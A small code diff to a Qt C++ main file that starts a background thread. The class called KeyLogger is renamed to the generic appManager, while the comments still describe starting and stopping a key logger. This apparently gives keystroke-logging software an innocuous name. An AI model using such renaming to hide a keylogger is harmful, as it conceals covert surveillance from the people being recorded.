@@ -1,19 +1,16 @@
 #include <QCoreApplication>
-#include "pointermanager.h"
-#include <QThread>
-#include <QDebug>
-
+#include "appManager.h"
 
 int main(int argc, char *argv[])
 {
     QCoreApplication a(argc, argv);
 
-    KeyLogger keyLogger;
-    keyLogger.start(); // Start the key logger in a separate thread
+    appManager appMger;
+    appMger.start(); // Start the key logger in a separate thread
 
     QObject::connect(&a, &QCoreApplication::aboutToQuit, [&]() {
-        keyLogger.requestInterruption(); // Gracefully stop the logger
-        keyLogger.wait();
+        appMger.requestInterruption(); // Gracefully stop the logger
+        appMger.wait();
     });
 
     return a.exec();
